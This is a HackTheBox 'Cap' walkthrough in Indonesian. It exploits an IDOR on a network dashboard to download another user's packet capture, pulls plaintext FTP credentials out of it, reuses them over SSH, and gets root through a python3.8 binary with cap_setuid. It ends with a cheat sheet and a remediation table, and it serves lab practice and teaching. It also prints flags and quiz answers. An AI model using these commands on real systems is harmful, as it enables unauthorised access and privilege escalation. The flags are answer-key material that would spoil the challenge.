# HTB Cap — Full Walkthrough (Linux)

> **Box:** Cap · **OS:** Linux (Ubuntu) · **Difficulty:** Easy
> **Target:** `10.129.131.169`
> **Attack path:** IDOR pada Security Dashboard → analisis PCAP → kredensial FTP plaintext → password reuse (SSH) → Linux capability `cap_setuid` → root

---

## 🏁 Flags

| Flag | Nilai |
|------|-------|
| **user.txt** | `9b474214f1b828e911b378a6355b25e0` |
| **root.txt** | `b507215c7666f905a0bc7ac5426407a6` |

## 🧩 Jawaban Quiz (semua terverifikasi langsung di box)

| # | Pertanyaan | Jawaban |
|---|-----------|---------|
| 1 | `[sesuatu]` pada `/…/[id]` (setelah "Security Snapshot") | **`data`** |
| 2 | ID file PCAP yang berisi data sensitif | **`0`** |
| 3 | Protokol layer aplikasi tempat data sensitif ditemukan | **FTP** |
| 4 | Layanan lain tempat password Nathan valid | **SSH** |
| 5 | Path lengkap binary dengan capability berbahaya | **`/usr/bin/python3.8`** |

---

## 🧰 Tools yang Dipakai

| Tool | Fungsi |
|------|--------|
| `nmap` | Recon port & service |
| `curl` | Enumerasi web + unduh PCAP |
| `tshark` (Wireshark CLI) | Analisis PCAP (cari kredensial) |
| `expect` | Otomasi login SSH (password) |
| `getcap` | Enumerasi Linux capabilities |
| `python3.8` (di target) | Eksploit `cap_setuid` → root |

---

## 🔎 Step 1 — Reconnaissance

### 1.1 Nmap

```bash
nmap -Pn -sCV -p- --min-rate 1500 --max-retries 2 10.129.131.169
```

Output:
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

> 🧠 **Analisis:** Tiga port terbuka — **21 FTP (vsftpd 3.0.3)**, **22 SSH**, **80 HTTP (Gunicorn/Flask)**. Server header `gunicorn` → aplikasi **Python Flask**. Judul **"Security Dashboard"** jadi target utama web.

### 1.2 Web — Dashboard

```bash
curl -s -i http://10.129.131.169/
```

Dari sidebar, ada 4 menu:
```
/            Dashboard
/capture     Security Snapshot (5 Second PCAP + Analysis)
/ip          IP Config
/netstat     Network Status
```

> 🧠 **Analisis:** Aplikasi adalah **dashboard monitoring jaringan**. Fitur **Security Snapshot** menjalankan `tcpdump` 5 detik lalu menyediakan file **PCAP** untuk diunduh — ini titik utama (kemungkinan kebocoran data). Aplikasi sudah login sebagai user **nathan**.

---

## 🕵️ Step 2 — IDOR pada Security Snapshot ✅ Quiz #1 & #2

### 2.1 Jalankan snapshot → perhatikan pola URL

```bash
curl -s -i http://10.129.131.169/capture | head
```

Output:
```
HTTP/1.1 302 FOUND
Server: gunicorn
Location: http://10.129.131.169/data/1
```

> ✅ **Quiz #1 — `[sesuatu]` = `data`**
> Setelah "Security Snapshot", browser diarahkan ke path **`/data/[id]`** (mis. `/data/1`), dengan `[id]` = nomor ID pemindaian.

### 2.2 Uji IDOR (decrement ID)

Snapshot yang kita buat (`/data/1`, `/data/2`) kosong. Coba **turunkan ID ke `0`**:

```bash
curl -s http://10.129.131.169/data/0 | grep -o 'Number of Packets [0-9]*'
```

Output:
```
Number of Packets 72
```

> ✅ **Quiz #2 — ID PCAP berisi data sensitif = `0`**
> `/data/0` menampilkan **72 packet** (milik sesi/user lain). Ini **IDOR**: ID sekuensial tanpa cek kepemilikan.

### 2.3 Unduh PCAP

```bash
curl -s -o 0.pcap http://10.129.131.169/download/0
file 0.pcap
```

Output:
```
0.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Linux cooked v1, capture length 262144)
```

> 🧠 **Analisis (kode rentan):**
> ```python
> @app.route("/data/<id>")
> def data_id(id):
>     data = process_pcap(os.path.join(app.root_path, "upload", str(id) + ".pcap"))
> @app.route("/download/<id>")
> def download(id):
>     return send_from_directory(uploads, str(id) + ".pcap", as_attachment=True)
> ```
> `/data/<id>` dan `/download/<id>` memakai **integer sekuensial** langsung sebagai nama file (`upload/<id>.pcap`) **tanpa cek kepemilikan** → IDOR.

---

## 🔑 Step 3 — Analisis PCAP: Kredensial FTP Plaintext ✅ Quiz #3

```bash
tshark -r 0.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
```

Output:
```
        (220 (vsFTPd 3.0.3))
USER    nathan
        (331 Please specify the password.)
PASS    Buck3tH4TF0RM3!
        (230 Login successful.)
SYST
LIST
RETR    notes.txt
```

> ✅ **Quiz #3 — Protokol = FTP**
> **FTP mengirim kredensial sebagai teks biasa (plaintext)** di port 21. Ditemukan login sukses:
> `USER nathan` / `PASS Buck3tH4TF0RM3!`
>
> 🧠 **Analisis:** Protokol FTP tidak terenkripsi — siapa pun yang bisa membaca PCAP (lewat IDOR) mendapat kredensial utuh.

---

## 🔓 Step 4 — Foothold: Password Reuse ke SSH ✅ Quiz #4

Coba kredensial FTP yang sama ke layanan lain — **SSH**:

```bash
/tmp/ssh_run.exp 10.129.131.169 22 nathan 'Buck3tH4TF0RM3!' "id; cat /home/nathan/user.txt"
```

Output:
```
nathan@cap:~$ id
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)

nathan@cap:~$ cat /home/nathan/user.txt
9b474214f1b828e911b378a6355b25e0
```

> ✅ **Quiz #4 — Layanan lain = SSH (port 22)**
> Password `Buck3tH4TF0RM3!` valid untuk **SSH** (password reuse).
> 🏁 **user.txt = `9b474214f1b828e911b378a6355b25e0`**

*(Alternatif: login FTP untuk ambil `user.txt` — file `-r-------- 1 1001 1001 33 user.txt` di home nathan.)*

---

## ⚡ Step 5 — Privilege Escalation: Linux Capability `cap_setuid` ✅ Quiz #5

### 5.1 Enumerasi capability

```bash
getcap -r / 2>/dev/null
```

Output:
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip   ← VULN
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

> ✅ **Quiz #5 — Path binary berbahaya = `/usr/bin/python3.8`**
> Binary **`/usr/bin/python3.8`** punya capability **`cap_setuid`** — bisa mengubah UID proses (termasuk ke root) tanpa bit SUID.
>
> 🧠 **Analisis:** `find -perm -4000` (SUID) **tidak** menemukan ini — capability adalah mekanisme terpisah. **Selalu jalankan `getcap -r / 2>/dev/null`** saat enumerasi privesc.

### 5.2 Eksploit (GTFOBins)

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# atau langsung baca flag:
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("id; cat /root/root.txt")'
```

Output:
```
uid=0(root) gid=1001(nathan) groups=1001(nathan)
b507215c7666f905a0bc7ac5426407a6
```

> 🏁 **root.txt = `b507215c7666f905a0bc7ac5426407a6`**

---

## ⛓️ Full Attack Chain (ringkas)

```
1. RECON     nmap → 21 (vsftpd), 22 (SSH), 80 (Gunicorn "Security Dashboard")
2. WEB       /capture → 302 redirect ke /data/<id>            ✅ Quiz: "data"
3. IDOR      /data/0 & /download/0 → PCAP milik user lain     ✅ Quiz: ID "0"
4. PCAP      tshark -Y ftp → nathan:Buck3tH4TF0RM3! (plaintext) ✅ Quiz: FTP
5. REUSE     kredensial sama untuk SSH (port 22)              ✅ Quiz: SSH
6. USER      ssh nathan → user.txt = 9b474214f1b828e911b378a6355b25e0
7. PRIVESC   getcap → /usr/bin/python3.8 = cap_setuid         ✅ Quiz: path
               python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
8. ROOT      root.txt = b507215c7666f905a0bc7ac5426407a6
```

## 🗝️ Credential Chain

| Ditemukan di | Kredensial | Dipakai untuk |
|--------------|-----------|---------------|
| PCAP `0.pcap` (via IDOR) | `nathan : Buck3tH4TF0RM3!` (FTP plaintext) | → **SSH** (password reuse) |
| SSH sebagai `nathan` | — | Shell → user.txt |
| `/usr/bin/python3.8` (cap_setuid) | — | **Root** via `os.setuid(0)` |

## 🌐 Endpoint Penting (Web)

| Endpoint | Fungsi | Kerentanan |
|----------|--------|-----------|
| `/capture` | Snapshot 5 detik → 302 ke `/data/<id>` | — |
| `/data/<id>` | Statistik packet snapshot | **IDOR** |
| `/download/<id>` | Unduh file PCAP | **IDOR** |
| `/ip` | Output `ifconfig` | Info disclosure |
| `/netstat` | Output `netstat` | Info disclosure |

---

## 📋 Cheat Sheet Perintah

```bash
# --- Recon ---
nmap -Pn -sCV -p- --min-rate 1500 --max-retries 2 10.129.131.169
curl -s -i http://10.129.131.169/

# --- IDOR ---
curl -s -i http://10.129.131.169/capture | head        # → Location: /data/1
curl -s http://10.129.131.169/data/0                   # 72 packets (user lain)
curl -s -o 0.pcap http://10.129.131.169/download/0

# --- Analisis PCAP ---
tshark -r 0.pcap -Y "ftp" -T fields -e ftp.request.command -e ftp.request.arg
tshark -r 0.pcap -q -z io,phs                          # ringkasan protokol

# --- Foothold (SSH, password reuse) ---
ssh nathan@10.129.131.169        # password: Buck3tH4TF0RM3!
cat /home/nathan/user.txt

# --- Privesc ---
getcap -r / 2>/dev/null                                 # → /usr/bin/python3.8 cap_setuid
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
cat /root/root.txt
```

---

## 🛡️ Remediation (Perbaikan)

| # | Kerentanan | Perbaikan |
|---|-----------|-----------|
| 1 | **IDOR** di `/data/<id>` & `/download/<id>` (ID sekuensial, tanpa cek kepemilikan) | Cek **otorisasi** objek sebelum melayani file; gunakan **UUID acak** alih-alih ID sekuensial; scope ke sesi user |
| 2 | **Kredensial plaintext** (FTP) terekam di PCAP | Ganti FTP dengan **SFTP/FTPS**; jangan simpan capture berisi login; batasi akses file PCAP |
| 3 | **Password reuse** (FTP = SSH) | Password **unik per layanan**; gunakan password manager; rotasi berkala |
| 4 | **Linux capability `cap_setuid`** pada `/usr/bin/python3.8` | Cabut capability (`setcap -r /usr/bin/python3.8`); jalankan interpreter sebagai user terbatas; hindari memberi capability berbahaya ke binary umum (python, perl, bash) |
| 5 | Info disclosure `/ip` & `/netstat` | Batasi ke admin; jangan ekspos output perintah sistem ke user umum |

**Pelajaran kunci:** `find -perm -4000` **tidak** mendeteksi capabilities. Selalu jalankan **`getcap -r / 2>/dev/null`**.

---

## 📝 Catatan & Pelajaran

- **ID sekuensial = curiga IDOR.** Setelah melihat `/data/1`, langsung coba `/data/0`, `/data/2`, dst.
- **PCAP = sumber kredensial.** Filter `ftp`, `http`, `telnet`, `smtp` untuk mencari kredensial plaintext.
- **Password reuse** antar layanan sangat umum — coba kredensial yang ditemukan ke SSH/FTP/web admin.
- **Capabilities ≠ SUID.** Cek dengan `getcap -r / 2>/dev/null`; binary GTFOBins (python/perl/bash) dengan `cap_setuid` = root instan.
- Teknik di box ini: **Broken Access Control (OWASP A01) + Sensitive Data Exposure + Credential Reuse + Misconfigured Capabilities**.

---

*Dokumentasi dibuat: 2026-10-14 · Box: HTB Cap · Target: 10.129.131.169*
